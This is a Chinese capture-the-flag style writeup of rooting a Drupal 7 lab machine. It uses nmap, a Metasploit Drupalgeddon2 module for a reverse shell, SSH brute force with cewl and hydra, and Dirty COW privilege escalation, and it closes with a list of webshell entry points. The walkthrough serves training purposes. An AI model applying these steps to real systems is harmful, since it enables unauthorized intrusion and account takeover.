# Drupal 7 渗透实战 Writeup

> **目标：** Drupal 7 靶机
> **攻击路径：** 主机发现 → 端口扫描 → 已知漏洞利用 → 字典爆破 → 内核提权
> **最终权限：** root

---

## 一、主机发现与端口扫描

### 1.1 确认目标 IP

拿到靶机后先确认网卡配置正确，使用 `netdiscover` 配合 MAC 地址定位目标：

```bash
netdiscover -r 192.168.193.0/24
```

**结果：** 目标 IP `192.168.193.139`（攻击机 `192.168.193.128`）

### 1.2 全端口扫描

```bash
nmap -p- 192.168.193.139
```

**结果：**

| 端口 | 服务 | 说明 |
|---|---|---|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Web 服务 |
| **1898/tcp** | cymtec-port | **Drupal 7 Web 服务** |

> 💡 注意到 1898 这个非标准端口上跑着 Web 服务，这是本题的关键入口。

---

## 二、Web 信息收集

### 2.1 访问站点

先访问 80 端口，再试 1898 端口 —— 发现 1898 端口同样能打开网站页面。

```bash
dirsearch -u http://192.168.193.139
dirsearch -u http://192.168.193.139:1898
```

### 2.2 识别系统与用户

通过页面特征与 JS 文件分析，识别出：

- **CMS 类型：** Drupal 7
- **潜在用户名：** `tiago`、`eder`

页面上还发现一个二维码、一个音频、一个视频 —— 属于彩蛋性质，未提供有效凭据（仅泄露了账户名）。

---

## 三、漏洞利用获取 Shell

### 3.1 确定漏洞

查询资料得知 Drupal 7 存在 **CVE-2018-7600（Drupalgeddon 2）** 远程代码执行漏洞。

**漏洞原理：**

Drupal 7 的 Form API 在处理用户提交数据时，未能正确过滤 `#` 开头的特殊渲染数组。攻击者在表单字段中注入 `#post_render` 或 `#lazy_builder` 回调，指向 `system` 或 `exec` 函数。Drupal 渲染引擎在处理时**会直接调用该回调**，导致任意 PHP 代码执行。

**影响版本：** Drupal 7.x ~ 7.58

### 3.2 Metasploit 利用

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.193.139
set RPORT 1898
set LHOST 192.168.193.128
run
```

**成功获得反弹 Shell。**

---

## 四、用户权限获取

### 4.1 信息收集

进入 Shell 后收集信息，仅发现一个用户 `tiago`。

尝试 SSH 连接，发现需要密码。手工尝试多次后，发现密码是该用户的**姓氏**。

> 💡 正确做法应该先用 `cewl` 抓取站点关键词生成字典，再进行 SSH 爆破：

```bash
cewl http://192.168.193.139:1898/ -w key2.txt
hydra -l tiago -P key2.txt ssh://192.168.193.139
```

### 4.2 登录 SSH

**当前权限：** 普通用户 `tiago`

---

## 五、本地提权

### 5.1 内核版本探测

```bash
uname -a
```

### 5.2 漏洞对比分析

查询后发现该内核存在三种可用提权漏洞，逐一分析适用性：

| 漏洞编号 | 名称 | 原理 | 影响版本 | 稳定性 |
|---|---|---|---|---|
| **CVE-2018-7600** | Drupalgeddon 2 | Drupal Form API 渲染数组注入 | Drupal 7.x ~ 7.58 | — |
| **CVE-2016-5195** | **脏牛（Dirty Cow）** | Linux 内核写时复制（COW）机制存在竞争条件，允许低权限用户向只读内存映射写入数据，可直接修改 `/etc/passwd` 添加 uid=0 的 root 用户 | 内核 2.6.22 ~ 4.8.3 | **极高** |
| **CVE-2015-1328** | Overlayfs 提权 | Ubuntu 内核 OverlayFS 实现存在权限检查缺陷，允许普通用户通过挂载操作获取 root 权限 | Ubuntu 12.04~15.04，内核 3.13.0-24 ~ 3.19.0-21 | 高 |

### 5.3 选择并执行 EXP

综合稳定性与便利性，最终选择**脏牛（CVE-2016-5195）**：

```bash
# 将 EXP 上传至 /tmp 目录
# 使用 g++ 编译后运行，程序会自动向 /etc/passwd 写入一个 uid=0 的新用户
g++ -o exp 40847.cpp
./exp
```

Kali 中自带该 EXP，编译后上传至目标机执行。

### 5.4 拿到 flag

**提权成功，获得 root Shell，读取 flag。**

---

## 六、总结

| 阶段 | 关键手段 |
|---|---|
| 主机发现 | netdiscover + MAC 地址比对 |
| 端口扫描 | nmap -p- 发现非标准端口 1898 |
| 获取 Shell | CVE-2018-7600（Drupalgeddon 2）RCE |
| 用户权限 | cewl 生成字典 + SSH 爆破 |
| 权限提升 | CVE-2016-5195（脏牛）内核提权 |

### 核心启示

1. **注意非标准端口** —— Web 服务不一定跑在 80/443 上
2. **识别 CMS 版本后优先查已知漏洞** —— 开源 CMS 的历史 CVE 是最快的突破口
3. **提权前做方案对比** —— 同样能提权，选择稳定性高的 EXP 能少走弯路
4. **密码习惯是突破口** —— 姓氏、生日、站点关键词都是常见弱口令来源

---

## 附：Web 后台 Getshell 常见入口（备忘）

| 方式 | 说明 |
|---|---|
| 模板编辑器 | 后台主题/模板编辑处直接写入 PHP |
| 文件上传 | 未校验类型导致上传 WebShell |
| ZIP 自解压 | 上传压缩包后解压执行 |
| 远程图片 | 通过远程 URL 加载图片写入 Shell |
| 编辑器漏洞 | 富文本编辑器（如 TinyMCE）的已知漏洞 |
| 备份文件 | 数据库/站点备份文件泄露 |
| SQL 语句 | 后台存在注入点，通过注入写入文件 |
